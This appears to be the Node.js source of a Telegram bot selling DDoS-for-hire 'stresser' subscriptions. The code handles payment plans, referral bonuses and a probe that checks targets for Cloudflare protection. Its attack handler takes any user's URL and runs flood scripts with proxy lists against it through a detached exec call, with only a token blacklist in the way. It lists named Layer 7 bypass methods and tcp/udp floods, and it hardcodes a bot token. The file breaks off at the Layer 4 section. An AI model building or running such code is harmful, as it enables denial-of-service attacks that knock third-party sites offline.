// Copyright t.me/BcS_RaiFuL
const axios = require('axios');
const fs = require('fs');
const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const https = require('https');
const { Client } = require('ssh2');

process.on('uncaughtException', e => console.error('UNCAUGHT:', e.message, e.stack));
process.on('unhandledRejection', r => console.error('UNHANDLED:', r));

// ===== PREMIUM EMOJI IDS =====
const E = {
    CHECK: "5202185369554023984",
    LIGHTNING: "5201945242227472933",
    WARNING: "5202101484547766658",
    CROSS: "5203950815861046184",
    CROWN: "5201906965478930360",
    NEW: "5203924002380212799",
    MEDAL: "5204331581891702000",
    GLOBE: "5201732344993576400",
    MAIL: "5204096174734207869",
    STAR_STRUCK: "5201834075588950819",
    GAME: "5201939362417243050",
    APPLE: "5204061054786632138",
    KING: "5202062889971646220",
    SHOCK: "5202010985291871421",
    PARTY: "5204244329631082615",
    CRY: "5201841261069236516",
    SAD: "5203954956209517932",
    RELAX: "5204115145604756514",
    GRIMACE: "5204383160153963970",
    FAST_FWD: "5203915043078436374",
    ARROW: "5201738280638381060",
    HEART_ARROW: "5202125381745799537",
    TAG: "5204183147821954616",
    MONEY: "5204179389725568654",
    POLICE: "5204219848317497350",
    BRIEFCASE: "5202202098451640536",
    WINK: "5204131857322503581",
    RELIEVED: "5204315505829114474",
    HEART_EYES: "5201705497153008499",
    LOVE: "5202003189926230084",
    HEART_BLUE: "5202087800781960869",
    MEGAPHONE: "5204033408082143996",
    WOMAN_TECH: "5204435863697649763",
    GREEN: "5204121626710405189",
    CLIP: "5204041551340137268",
    WIFI: "5201735372945520721",
    THUMBS_UP: "5204288207016981888",
    FLEUR: "5203997089838691720",
    COOL: "5201744070254297041",
    GLOW: "5204109450478122791",
    TEACHER: "5204109897154721051",
    GUN: "5202167764483076994",
    YELLOW: "5204027755905183594",
    HEART_RED: "5202040723645429348",
    DIAMOND: "5202132945183208703",
    DOWN: "5202112453894238347",
    MEDAL1: "5204147628442415383",
    STOP: "5204315024792777263",
    DIAMOND2: "5204291282213567427",
    CAMERA: "5204074665537993236",
    CYCLONE: "5204311666128350421",
    GIFT: "5204334519649335950",
    SOS: "5202130256533683388",
    POINT_LEFT: "5203967776686894511",
    STAR: "5202036282649244841",
    REFRESH: "5203988328105405942",
    BAG: "5204324795843375748",
    CHAT: "5201851182443689311",
    INDIA: "5204193846585487358",
    HUNDRED: "5201688789730229935",
    TOP: "5203955226792454971",
    ROCKET: "6170283689700760510",
    FIRE: "6170043987575970306",
    STAR2: "6169978854396925839",
    SKULL: "6170452086778501713",
    LOVE_FIRE: "6170131029383190045",
    SMUG: "6170289848683862181",
    SMILE: "6170209738953856918",
    POUT: "6170408252342278361",
    DOWN2: "6170389908536957604",
    CALENDAR: "6170434833894872937",
    BOOM: "6170364409316120814",
    MONEY_FACE: "6170090888618842913",
    LION: "6170152744737838825",
    DRAGON: "6170406757693659761",
    ANGEL: "6170273957304867945",
    CLOWN: "6170325819034965952",
    GHOST: "6170308841029247219",
    BIRD: "6170456918616709390",
    SILENT: "6169957809057174787",
    MOAI: "6170239576091662137",
    LEAF: "6169973996788914400",
    CLINK: "6170389818342645293",
    MOON: "6170117809473853608",
    BOTTLE: "6170479553094358785",
    ROSE: "6170245254038427631",
    SKULL2: "6170432295569201876",
    CHART_DOWN: "6170274919377541093",
    CHART_UP: "6170088049645459435",
    SPARKLE: "6170257915602016933",
    PRAY: "6170133962845854155",
    POINT_UP: "6172692878591007426",
    PINK_HEART: "5776297333092258248",
    BLACK_HEART: "5776330683513311943",
    BLUE_HEART: "5775911576309600952",
    GREEN_HEART: "5776343761688727975",
    CARD: "5776026402260259662",
    MONEY_BAG: "5776103539872896061",
    INBOX: "5776303079758500750",
    OUTBOX: "5776366177123045379",
    CART: "5775925350269719113",
    ROCKET2: "5775923486253912796",
    INFO: "5776121926627888870",
    TRASH: "5775903905498010383",
    LOCK: "5998881947328188290",
    ANCHOR: "6001078118725456537",
    GRAPH: "6001546944470587024",
    TROPHY: "5998897065613071275",
    N0: "5776310153569637272", N1: "5776382377739686347",
    N2: "5776002049795691286", N3: "5776202942595994368",
    N4: "5775929237215121662", N5: "5776094821089284746",
    N6: "5776304677486334642", N7: "5776038870550319204",
    N8: "5775971577002725516", N9: "5776009896700940384",
    PLUS: "5204288207016981888",
    MINUS: "5203950815861046184",
    LIST: "5204183147821954616",
    DOWNLOAD: "5202112453894238347",
    UPLOAD: "5203955226792454971",
    CONTROL: "5201945242227472933",
    SUCCESS: "5202185369554023984",
    DANGER: "5204315024792777263",
    SCAN: "5204074665537993236",
    MUSIC: "5204311666128350421",
    DESKTOP: "5204435863697649763",
    PHONE: "5201744070254297041",
    SWORD: "5202167764483076994",
    UFO: "5203997089838691720",
    SIGNAL: "5201735372945520721",
    SEARCH1: "5204041551340137268",
    LINK: "5204096174734207869",
    CLOCK: "6170434833894872937",
    BOOK: "5204183147821954616"
};

function emoji(name) {
    try {
        const id = E[name] || name;
        return `<tg-emoji emoji-id="${id}">⭐</tg-emoji>`;
    } catch (e) { return '⭐'; }
}

// ===== CONFIG =====
const CONFIG = {
    FORCE_JOIN_CHANNEL: "@BLACK_CYBER_FORCE",
    DAILY_FREE_ATTACK_LIMIT: 4,
    REFERRAL_LIMIT_PER_REFER: 1,
    REFERRAL_CLAIM_CMD: "/claimlimit"
};

const FILES = {
    referrals: 'referrals.json',
    dailyLimits: 'daily_limits.json',
    admins: 'AdminId.json',
    plans: 'plans.json',
    claims: 'claimCodes.json',
    vps: 'vps_list.json',
    banned: 'banned.json',
    users: 'users.json',
    maintenance: 'maintenance.json'
};

function loadJSON(f, def) {
    try { return JSON.parse(fs.readFileSync(f, 'utf8')); } catch (e) { return def; }
}
function saveJSON(f, d) {
    try { fs.writeFileSync(f, JSON.stringify(d, null, 2)); } catch (e) { console.error('save', f, e.message); }
}

let referralData = loadJSON(FILES.referrals, {});
let dailyLimitData = loadJSON(FILES.dailyLimits, {});
let adminIds = loadJSON(FILES.admins, []);
let claimCodes = loadJSON(FILES.claims, []);
let vpsList = loadJSON(FILES.vps, []);
let bannedUsers = loadJSON(FILES.banned, []);
let usersData = loadJSON(FILES.users, {});
let maintenanceMode = loadJSON(FILES.maintenance, { enabled: false, message: "" });

if (!Array.isArray(adminIds)) adminIds = [];
if (!Array.isArray(claimCodes)) claimCodes = [];
if (!Array.isArray(vpsList)) vpsList = [];
if (!Array.isArray(bannedUsers)) bannedUsers = [];
if (typeof usersData !== 'object' || Array.isArray(usersData)) usersData = {};

// ===== BOT =====
const token = '8858544286:AAFRCOOB9CSHIXdcPSGZwAFpp7jEGk10JU8';
const bot = new TelegramBot(token, { polling: { interval: 300, autoStart: true, params: { timeout: 10 } } });

bot.on('polling_error', e => console.error('POLLING:', e.message));
bot.on('error', e => console.error('BOT ERROR:', e.message));

// ===== HELPERS =====
function isAdmin(id) { return adminIds.includes(id); }
function isBanned(id) { return bannedUsers.includes(id); }

function getUserPlan(chatId) {
    const plans = loadJSON(FILES.plans, []);
    const p = plans.find(x => String(x.id) === String(chatId));
    return p ? p.planType : "None";
}

function getPlanLimits(chatId) {
    const p = getUserPlan(chatId);
    if (p === "SuperVIP") return { planType: "SuperVIP", concurrent: 5, timeLimit: 200 };
    if (p === "VIP") return { planType: "VIP", concurrent: 3, timeLimit: 120 };
    if (p === "Basic") return { planType: "Basic", concurrent: 1, timeLimit: 80 };
    return { planType: "Free", concurrent: 1, timeLimit: 60 };
}

function getTodayKey(chatId) {
    return `${chatId}_${new Date().toDateString()}`;
}
function getDailyAttackCount(chatId) {
    return dailyLimitData[getTodayKey(chatId)] || 0;
}
function incrementDailyAttackCount(chatId) {
    const k = getTodayKey(chatId);
    dailyLimitData[k] = (dailyLimitData[k] || 0) + 1;
    saveJSON(FILES.dailyLimits, dailyLimitData);
}
function getRemainingFreeAttacks(chatId) {
    const plan = getUserPlan(chatId);
    if (plan === "VIP" || plan === "SuperVIP") return Infinity;
    const used = getDailyAttackCount(chatId);
    const refBonus = (referralData[chatId] && referralData[chatId].claimedLimits) || 0;
    const base = plan === "Basic" ? 999 : CONFIG.DAILY_FREE_ATTACK_LIMIT;
    return Math.max(0, base + refBonus - used);
}

function trackUser(msg) {
    try {
        if (!msg.from || msg.from.is_bot) return;
        const id = msg.from.id;
        const isNew = !usersData[id];
        usersData[id] = {
            username: msg.from.username || '',
            firstName: msg.from.first_name || '',
            joinedAt: (usersData[id] && usersData[id].joinedAt) || Date.now(),
            lastSeen: Date.now()
        };
        saveJSON(FILES.users, usersData);
        if (isNew && adminIds.length > 0) {
            const note = `${emoji('NEW')} <b>New User!</b>\n` +
                `ID: <code>${id}</code>\n` +
                `Name: ${msg.from.first_name || ''}\n` +
                `Username: @${msg.from.username || 'none'}`;
            adminIds.forEach(a => bot.sendMessage(a, note, { parse_mode: 'HTML' }).catch(() => {}));
        }
    } catch (e) {}
}

async function isJoined(userId) {
    if (!CONFIG.FORCE_JOIN_CHANNEL) return true;
    try {
        const m = await bot.getChatMember(CONFIG.FORCE_JOIN_CHANNEL, userId);
        return ["member", "administrator", "creator"].includes(m.status);
    } catch (e) { return false; }
}

async function gate(msg, skipJoin = false) {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (isBanned(userId)) {
        bot.sendMessage(chatId, `${emoji('CROSS')} <b>You are banned.</b>`, { parse_mode: 'HTML' }).catch(() => {});
        return false;
    }
    if (maintenanceMode.enabled && !isAdmin(userId)) {
        const m = maintenanceMode.message || "Bot is under maintenance. Please try again later.";
        bot.sendMessage(chatId, `${emoji('WARNING')} <b>Maintenance</b>\n\n${m}`, { parse_mode: 'HTML' }).catch(() => {});
        return false;
    }
    if (!skipJoin && CONFIG.FORCE_JOIN_CHANNEL) {
        const ok = await isJoined(userId);
        if (!ok) {
            bot.sendMessage(chatId,
                `${emoji('WARNING')} <b>Please join our channel first:</b>\n${CONFIG.FORCE_JOIN_CHANNEL}`,
                { parse_mode: 'HTML' }).catch(() => {});
            return false;
        }
    }
    return true;
}

// ===== ACTIVE ATTACKS =====
const activeAttacks = new Map();

function getUserConcurrent(chatId) {
    const list = activeAttacks.get(chatId) || [];
    const now = Date.now();
    return list.filter(a => (now - a.startTime) < a.duration * 1000).length;
}

function addActiveAttack(chatId, target, method, duration) {
    const list = activeAttacks.get(chatId) || [];
    const entry = { target, method, duration, startTime: Date.now() };
    list.push(entry);
    activeAttacks.set(chatId, list);
    setTimeout(() => {
        const cur = activeAttacks.get(chatId) || [];
        activeAttacks.set(chatId, cur.filter(a => a.startTime !== entry.startTime));
    }, duration * 1000);
}

function isValidIP(ip) {
    return /^(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}$/.test(ip);
}

function getSSLCertificate(url) {
    return new Promise(resolve => {
        try {
            const hostname = new URL(url).hostname;
            const req = https.request({ host: hostname, port: 443, method: 'GET' }, res => {
                const c = res.socket.getPeerCertificate();
                resolve(c && c.issuer && c.issuer.O ? c.issuer.O : null);
            });
            req.on('error', () => resolve(null));
            req.setTimeout(8000, () => { req.destroy(); resolve(null); });
            req.end();
        } catch { resolve(null); }
    });
}

// ===== TRACK EVERY MESSAGE =====
bot.on('message', msg => trackUser(msg));

// ============================================================
// ============  USER COMMANDS  ===============================
// ============================================================

// /start
bot.onText(/^\/start(?:\s+ref_([A-Z0-9]+))?/, async (msg, match) => {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const refCode = match && match[1] ? match[1] : null;

        // referral handling
        if (refCode) {
            const referrerId = parseInt(refCode, 36);
            if (!isNaN(referrerId) && referrerId !== userId) {
                if (!referralData[referrerId]) referralData[referrerId] = { claimedLimits: 0, referrals: [] };
                if (!referralData[referrerId].referrals) referralData[referrerId].referrals = [];
                if (!referralData[referrerId].referrals.some(r => r.userId === userId)) {
                    referralData[referrerId].referrals.push({ userId, claimed: false });
                    if (!referralData[userId]) referralData[userId] = { claimedLimits: 0, referrals: [] };
                    referralData[userId].referredBy = referrerId;
                    saveJSON(FILES.referrals, referralData);
                    bot.sendMessage(referrerId,
                        `${emoji('SUCCESS')} New referral! <code>${userId}</code> joined via your link.\n` +
                        `Use ${CONFIG.REFERRAL_CLAIM_CMD} to claim.`,
                        { parse_mode: 'HTML' }).catch(() => {});
                }
            }
        }

        // admin bypasses force join check
        if (!isAdmin(userId)) {
            const ok = await gate(msg, true);
            if (!ok) return;
            const joined = await isJoined(userId);
            if (!joined) {
                return bot.sendMessage(chatId,
                    `${emoji('WARNING')} <b>Please join our channel first:</b>\n${CONFIG.FORCE_JOIN_CHANNEL}`,
                    { parse_mode: 'HTML' }).catch(() => {});
            }
        }

        bot.sendMessage(chatId,
            `${emoji('CROWN')} <b>Welcome to RAIFUL VIP Stresser!</b>\n\n` +
            `${emoji('CHECK')} Free users get <b>${CONFIG.DAILY_FREE_ATTACK_LIMIT}</b> attacks/day.\n` +
            `${emoji('GIFT')} Use <code>/refer</code> to get more free attacks!\n\n` +
            `${emoji('BOOK')} Use /help for full commands list.`,
            { parse_mode: 'HTML' }).catch(() => {});
    } catch (e) { console.error('/start:', e.message); }
});

// /help
bot.onText(/^\/help/, async msg => {
    try {
        if (!await gate(msg)) return;
        bot.sendMessage(msg.chat.id,
            `${emoji('INFO')} <b>Help Menu</b>\n\n` +
            `${emoji('CROWN')} <b>User Commands</b>\n` +
            `${emoji('INFO')} /info — Your account info\n` +
            `${emoji('DIAMOND')} /plan — Plan & pricing\n` +
            `${emoji('CHECK')} /claim &lt;code&gt; — Redeem code\n` +
            `${emoji('SIGNAL')} /ongoing — Active attacks\n` +
            `${emoji('SWORD')} /method — Available methods\n` +
            `${emoji('SEARCH1')} /detect &lt;url&gt; — Detect protection\n` +
            `${emoji('GLOBE')} /http &lt;url&gt; — HTTP check\n` +
            `${emoji('ARROW')} /refer — Referral link\n` +
            `${emoji('SUCCESS')} /claimlimit — Claim refer bonus\n` +
            `${emoji('LIGHTNING')} /mycredit — Free attacks left\n\n` +
            `${emoji('CROWN')} <b>Owner:</b> @BcS_RaiFuL`,
            { parse_mode: 'HTML' }).catch(() => {});
    } catch (e) { console.error('/help:', e.message); }
});

// /info
bot.onText(/^\/info/, async msg => {
    try {
        if (!await gate(msg)) return;
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const plansData = loadJSON(FILES.plans, []);
        const userPlan = plansData.find(p => String(p.id) === String(userId));
        const planType = userPlan ? userPlan.planType : "Free";
        const limits = getPlanLimits(userId);
        const remaining = getRemainingFreeAttacks(userId);
        const refBonus = (referralData[userId] && referralData[userId].claimedLimits) || 0;

        const info = {
            "User ID": userId,
            "Username": "@" + (msg.from.username || "none"),
            "Name": msg.from.first_name || "",
            "Plan": planType,
            "Plan Expiry": userPlan ? new Date(userPlan.expiry).toLocaleString() : "N/A (Free)",
            "Time Limit": `${limits.timeLimit}s`,
            "Concurrent": limits.concurrent,
            "Free Attacks Left": remaining === Infinity ? "Unlimited" : remaining,
            "Refer Bonus": refBonus
        };
        bot.sendMessage(chatId,
            `${emoji('CHECK')} <b>Your Account</b>\n\n<pre>${JSON.stringify(info, null, 2)}</pre>`,
            { parse_mode: 'HTML' }).catch(() => {});
    } catch (e) { console.error('/info:', e.message); }
});

// /mycredit
bot.onText(/^\/mycredit/, async msg => {
    try {
        if (!await gate(msg)) return;
        const userId = msg.from.id;
        const rem = getRemainingFreeAttacks(userId);
        const plan = getUserPlan(userId);
        bot.sendMessage(msg.chat.id,
            `${emoji('LIGHTNING')} <b>Credit Status</b>\n\n` +
            `Plan: <b>${plan === 'None' ? 'Free' : plan}</b>\n` +
            `Free attacks left today: <b>${rem === Infinity ? 'Unlimited' : rem}</b>`,
            { parse_mode: 'HTML' }).catch(() => {});
    } catch (e) {}
});

// /plan
bot.onText(/^\/plan/, async msg => {
    try {
        if (!await gate(msg)) return;
        const chatId = msg.chat.id;
        const planMessage =
            `${emoji('DIAMOND')} <b>Choose Your Plan</b>\n\n<pre>` +
            `{\n` +
            `  "Basic Plan": {\n` +
            `    "1 Week": "500 tk / 5$",\n` +
            `    "2 Weeks": "800 tk / 8$",\n` +
            `    "3 Weeks": "1500 tk / 10.5$",\n` +
            `    "Duration": "80s", "Concurrent": 1\n` +
            `  },\n` +
            `  "VIP Plan": {\n` +
            `    "1 Week": "800 tk / 8$",\n` +
            `    "2 Weeks": "1500 tk / 10.5$",\n` +
            `    "3 Weeks": "2000 tk / 20$",\n` +
            `    "Duration": "120s", "Concurrent": 3\n` +
            `  },\n` +
            `  "SuperVIP Plan": {\n` +
            `    "1 Week": "1000 tk / 10$",\n` +
            `    "2 Weeks": "2000 tk / 20$",\n` +
            `    "3 Weeks": "2500 tk / 25$",\n` +
            `    "Duration": "200s", "Concurrent": 5\n` +
            `  },\n` +
            `  "Payment": ["Binance", "Bkash", "Nagad"]\n` +
            `}</pre>\n\n${emoji('BAG')} <b>Select payment method:</b>`;

        bot.sendMessage(chatId, planMessage, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: "💰 Binance", callback_data: "pay_binance" }],
                    [{ text: "💰 Bkash", callback_data: "pay_bkash" }],
                    [{ text: "💰 Nagad", callback_data: "pay_nagad" }],
                    [{ text: "👑 Contact Owner", url: "https://t.me/BcS_RaiFuL" }]
                ]
            }
        }).catch(() => {});
    } catch (e) { console.error('/plan:', e.message); }
});

bot.on('callback_query', q => {
    try {
        const chatId = q.message.chat.id;
        const data = q.data;
        let m = "";
        if (data === "pay_binance") m = `${emoji('CHECK')} <b>Binance Payment</b>\n\nSend to: <code>binance pay off</code>\nSend proof to @BcS_RaiFuL after.`;
        if (data === "pay_bkash") m = `${emoji('CHECK')} <b>Bkash Payment</b>\n\nSend to: <code>017*****</code>\nSend proof to @BcS_RaiFuL after.`;
        if (data === "pay_nagad") m = `${emoji('CHECK')} <b>Nagad Payment</b>\n\nSend to: <code>017******</code>\nSend proof to @BcS_RaiFuL after.`;
        if (m) bot.sendMessage(chatId, m, { parse_mode: 'HTML' }).catch(() => {});
        bot.answerCallbackQuery(q.id).catch(() => {});
    } catch (e) {}
});

// /method
bot.onText(/^\/method/, async msg => {
    try {
        if (!await gate(msg)) return;
        bot.sendMessage(msg.chat.id,
            `${emoji('SWORD')} <b>Available Methods</b>\n\n<pre>` +
            `{\n` +
            `  "Layer 7": {\n` +
            `    "Free":    ["flood","cibi","pidoras"],\n` +
            `    "Basic":   ["flood","cibi","pidoras"],\n` +
            `    "VIP":     ["cibi","glory","flood","quantum","pidoras","bypass","thunder","destroy","floodvip"],\n` +
            `    "SuperVIP":["cibi","glory","flood","quantum","pidoras","bypass","destroy","thunder","floodvip","mixbil","h2-fumi","h2-devil","h2-bypass","h2-flood","httpcostum"]\n` +
            `  },\n` +
            `  "Layer 4": {\n` +
            `    "Free":["tcp","udp"], "Basic":["tcp","udp"],\n` +
            `    "VIP":["tcp","udp"], "SuperVIP":["tcp","udp"]\n` +
            `  }\n` +
            `}</pre>\n\n${emoji('ARROW')} Usage:\n` +
            `<code>/flood https://example.com 60</code>\n` +
            `<code>/tcp 1.1.1.1 80 60</code>`,
            { parse_mode: 'HTML' }).catch(() => {});
    } catch (e) {}
});

// /refer
bot.onText(/^\/refer/, async msg => {
    try {
        if (!await gate(msg)) return;
        const userId = msg.from.id;
        const code = userId.toString(36).toUpperCase();
        const me = await bot.getMe();
        const link = `https://t.me/${me.username}?start=ref_${code}`;
        bot.sendMessage(msg.chat.id,
            `${emoji('DIAMOND')} <b>Referral System</b>\n\n` +
            `${emoji('ARROW')} Your link:\n<code>${link}</code>\n\n` +
            `${emoji('GIFT')} Each referral = <b>+${CONFIG.REFERRAL_LIMIT_PER_REFER}</b> free attack.\n` +
            `${emoji('CHECK')} Claim with <code>${CONFIG.REFERRAL_CLAIM_CMD}</code>`,
            { parse_mode: 'HTML' }).catch(() => {});
    } catch (e) { console.error('/refer:', e.message); }
});

// /claimlimit
bot.onText(/^\/claimlimit/, async msg => {
    try {
        if (!await gate(msg)) return;
        const userId = msg.from.id;
        if (!referralData[userId]) referralData[userId] = { claimedLimits: 0, referrals: [] };
        const pending = (referralData[userId].referrals || []).filter(r => !r.claimed);
        if (pending.length === 0)
            return bot.sendMessage(msg.chat.id, `${emoji('WARNING')} No pending referral bonuses.`, { parse_mode: 'HTML' }).catch(() => {});
        const count = pending.length * CONFIG.REFERRAL_LIMIT_PER_REFER;
        referralData[userId].claimedLimits = (referralData[userId].claimedLimits || 0) + count;
        pending.forEach(r => r.claimed = true);
        saveJSON(FILES.referrals, referralData);
        bot.sendMessage(msg.chat.id,
            `${emoji('SUCCESS')} Claimed <b>${count}</b> extra free attacks!\n` +
            `${emoji('DIAMOND')} Total bonus: <b>${referralData[userId].claimedLimits}</b>`,
            { parse_mode: 'HTML' }).catch(() => {});
    } catch (e) {}
});

// /ongoing
bot.onText(/^\/ongoing/, async msg => {
    try {
        if (!await gate(msg)) return;
        const chatId = msg.chat.id;
        const list = (activeAttacks.get(chatId) || []).filter(a =>
            Math.floor((Date.now() - a.startTime) / 1000) < a.duration);
        if (list.length === 0)
            return bot.sendMessage(chatId, `${emoji('WARNING')} <b>No ongoing attacks.</b>`, { parse_mode: 'HTML' }).catch(() => {});
        let r = `${emoji('DANGER')} <b>Ongoing Attacks</b>\n<pre>[\n`;
        list.forEach((a, i) => {
            const el = Math.floor((Date.now() - a.startTime) / 1000);
            r += `  { "host":"${a.target}", "method":"${a.method}", "elapsed":"${el}s", "remaining":"${Math.max(0, a.duration - el)}s" }${i < list.length - 1 ? ',' : ''}\n`;
        });
        r += `]</pre>`;
        bot.sendMessage(chatId, r, { parse_mode: 'HTML' }).catch(() => {});
    } catch (e) {}
});

// /detect
bot.onText(/^\/detect\s+(\S+)/, async (msg, match) => {
    try {
        if (!await gate(msg)) return;
        const chatId = msg.chat.id;
        let target = match[1];
        if (!/^https?:\/\//i.test(target)) target = 'https://' + target;
        bot.sendMessage(chatId, `${emoji('SCAN')} Scanning <code>${target}</code>...`, { parse_mode: 'HTML' }).catch(() => {});
        const t0 = Date.now();
        const res = await axios.get(target, {
            httpsAgent: new https.Agent({ rejectUnauthorized: false }),
            headers: { 'User-Agent': 'Mozilla/5.0' },
            timeout: 15000,
            validateStatus: () => true,
            maxRedirects: 5
        });
        const ms = Date.now() - t0;
        const h = res.headers || {};
        let out = `${emoji('SCAN')} <b>Detection Result</b>\n\n`;
        out += `URL: <code>${target}</code>\n`;
        out += `Status: <code>${res.status}</code>\n`;
        out += `Response: <code>${ms}ms</code>\n`;
        if (h['server']) out += `Server: <code>${h['server']}</code>\n`;
        if (h['server'] && String(h['server']).toLowerCase().includes('cloudflare'))
            out += `${emoji('CHECK')} <b>Cloudflare Detected</b>\n`;
        if (h['cf-ray']) out += `${emoji('LOCK')} CF-Ray: <code>${h['cf-ray']}</code>\n`;
        if (h['cf-cache-status']) out += `CF-Cache: <code>${h['cf-cache-status']}</code>\n`;
        if (h['x-powered-by']) out += `Powered-By: <code>${h['x-powered-by']}</code>\n`;
        if (res.status === 403) out += `${emoji('WARNING')} <b>Geo-block (403)</b>\n`;
        if (res.status === 503) out += `${emoji('WARNING')} <b>Service Unavailable (503)</b>\n`;
        const cert = await getSSLCertificate(target);
        if (cert) out += `${emoji('LOCK')} SSL: <code>${cert}</code>\n`;
        out += `\n${emoji('CHECK')} Detection complete.`;
        bot.sendMessage(chatId, out, { parse_mode: 'HTML' }).catch(() => {});
    } catch (e) {
        bot.sendMessage(msg.chat.id, `${emoji('CROSS')} Detect failed: ${e.message}`, { parse_mode: 'HTML' }).catch(() => {});
    }
});

// /http — FIXED (chunked output)
bot.onText(/^\/http\s+(\S+)/, async (msg, match) => {
    try {
        if (!await gate(msg)) return;
        const chatId = msg.chat.id;
        let url = match[1];
        if (!/^https?:\/\//i.test(url)) url = 'http://' + url;
        bot.sendMessage(chatId, `${emoji('SCAN')} HTTP check for <code>${url}</code>...`, { parse_mode: 'HTML' }).catch(() => {});

        const req = await axios.get(`https://check-host.net/check-http?host=${encodeURIComponent(url)}`, {
            headers: { Accept: 'application/json', 'User-Agent': 'Mozilla/5.0' },
            timeout: 15000
        });
        const rid = req.data && req.data.request_id;
        if (!rid) return bot.sendMessage(chatId, `${emoji('CROSS')} Request failed.`, { parse_mode: 'HTML' }).catch(() => {});

        await new Promise(r => setTimeout(r, 9000));
        const res = await axios.get(`https://check-host.net/check-result/${rid}`, {
            headers: { Accept: 'application/json' }, timeout: 15000
        });
        const data = res.data || {};
        const keys = Object.keys(data);
        if (keys.length === 0)
            return bot.sendMessage(chatId, `${emoji('CROSS')} No results yet.`, { parse_mode: 'HTML' }).catch(() => {});

        const lines = [];
        lines.push(`${emoji('GLOBE')} <b>HTTP Results</b> <code>${url}</code>\n`);
        let okCount = 0, failCount = 0;
        for (const loc of keys) {
            const v = data[loc];
            if (!Array.isArray(v) || !v[0]) { failCount++; continue; }
            const item = v[0];
            const time = item[0] ? (+item[0]).toFixed(2) + 's' : '-';
            const code = item[2] || item[1] || '-';
            const short = String(loc).split('.')[0];
            const em = (code === 200 || code === 301 || code === 302) ? emoji('CHECK') : emoji('CROSS');
            lines.push(`${em} <b>${short}</b> → <code>${code}</code> | ${time}`);
            okCount++;
        }
        lines.push(`\n${emoji('CHECK')} Online: ${okCount} | ${emoji('CROSS')} Offline: ${failCount}`);
        lines.push(`${emoji('LINK')} <a href="https://check-host.net/check-result/${rid}">Full report</a>`);

        const full = lines.join('\n');
        if (full.length <= 3900) {
            bot.sendMessage(chatId, full, { parse_mode: 'HTML', disable_web_page_preview: true }).catch(() => {});
        } else {
            const chunks = [];
            let cur = '';
            for (const ln of lines) {
                if ((cur + '\n' + ln).length > 3800) { chunks.push(cur); cur = ln; }
                else cur = cur ? cur + '\n' + ln : ln;
            }
            if (cur) chunks.push(cur);
            for (const c of chunks) {
                await bot.sendMessage(chatId, c, { parse_mode: 'HTML', disable_web_page_preview: true }).catch(() => {});
            }
        }
    } catch (e) {
        bot.sendMessage(msg.chat.id, `${emoji('CROSS')} Error: ${e.message}`, { parse_mode: 'HTML' }).catch(() => {});
    }
});

// ===== L7 ATTACK =====
const L7 = ['flood','glory','cibi','quantum','destroy','pidoras','bypass','thunder','floodvip','mixbil','h2-devil','h2-bypass','h2-fumi','h2-flood','httpcostum'];

L7.forEach(command => {
    const regex = new RegExp(`^\\/${command}\\s+(.+)$`, 'i');
    bot.onText(regex, async (msg, match) => {
        try {
            if (!await gate(msg)) return;
            const chatId = msg.chat.id;
            const args = match[1].split(/\s+/).filter(Boolean);
            if (args.length < 2)
                return bot.sendMessage(chatId, `${emoji('WARNING')} Usage: <code>/${command} <url> <seconds></code>`, { parse_mode: 'HTML' }).catch(() => {});

            const target = args[0];
            const time = parseInt(args[1], 10);
            const { planType, concurrent, timeLimit } = getPlanLimits(chatId);

            const allowed = {
                Free:     ['flood', 'cibi', 'pidoras'],
                Basic:    ['flood', 'cibi', 'pidoras'],
                VIP:      ['cibi','glory','flood','quantum','pidoras','bypass','thunder','destroy','floodvip','httpcostum'],
                SuperVIP: L7
            }[planType] || [];
            if (!allowed.includes(command))
                return bot.sendMessage(chatId, `${emoji('CROSS')} <b>Method not allowed for your plan (${planType}).</b>`, { parse_mode: 'HTML' }).catch(() => {});

            if (planType !== 'VIP' && planType !== 'SuperVIP') {
                const rem = getRemainingFreeAttacks(chatId);
                if (rem <= 0)
                    return bot.sendMessage(chatId, `${emoji('CROSS')} <b>Daily limit reached.</b>\nUse /refer for more attacks.`, { parse_mode: 'HTML' }).catch(() => {});
            }

            if (getUserConcurrent(chatId) >= concurrent)
                return bot.sendMessage(chatId, `${emoji('CROSS')} <b>Concurrent limit reached:</b> ${getUserConcurrent(chatId)}/${concurrent}`, { parse_mode: 'HTML' }).catch(() => {});

            if (!/^https?:\/\//i.test(target))
                return bot.sendMessage(chatId, `${emoji('CROSS')} Invalid URL. Use http(s)://`, { parse_mode: 'HTML' }).catch(() => {});
            if (isNaN(time) || time <= 0 || time > timeLimit)
                return bot.sendMessage(chatId, `${emoji('CROSS')} Time must be 1-${timeLimit}s`, { parse_mode: 'HTML' }).catch(() => {});
            const blacklisted = ['.dev', '.gov', '.r2dev'];
            if (blacklisted.some(d => target.endsWith(d)))
                return bot.sendMessage(chatId, `${emoji('CROSS')} Blacklisted target.`, { parse_mode: 'HTML' }).catch(() => {});

            const scripts = {
                flood: 'flood.js', glory: 'glory.js', cibi: 'cibi.js', quantum: 'quantum.js',
                destroy: 'destroy.js', pidoras: 'pidoras.js', bypass: 'bypass.js', thunder: 'thunder.js',
                floodvip: 'floodvip.js', mixbil: 'mixbil.js', 'h2-devil': 'h2-devil.js',
                'h2-bypass': 'h2-bypass.js', 'h2-fumi': 'h2-fumi.js', 'h2-flood': 'h2-flood.js',
                httpcostum: 'httpcostum.js'
            };
            const cmd = `node cache/${scripts[command]} ${target} ${time} 100 10 proxy.txt`;

            addActiveAttack(chatId, target, command.toUpperCase(), time);

            bot.sendMessage(chatId,
                `${emoji('DANGER')} <b>Attack Launched</b>\n<pre>{\n` +
                `  "status": "success",\n` +
                `  "host": "${target}",\n` +
                `  "time": ${time},\n` +
                `  "method": "${command.toUpperCase()}",\n` +
                `  "concurrent": "${getUserConcurrent(chatId)}/${concurrent}"\n` +
                `}</pre>`,
                { parse_mode: 'HTML', disable_web_page_preview: true }).catch(() => {});

            if (planType !== 'VIP' && planType !== 'SuperVIP') incrementDailyAttackCount(chatId);

            try {
                const p = exec(cmd, { detached: true, stdio: 'ignore' });
                p.unref();
            } catch (e) { console.error('exec:', e.message); }
        } catch (e) { console.error('L7:', e.message); }
    });
});

// ===== L4 ATTACK =====
['tcp', 'udp'].forEach(command => {
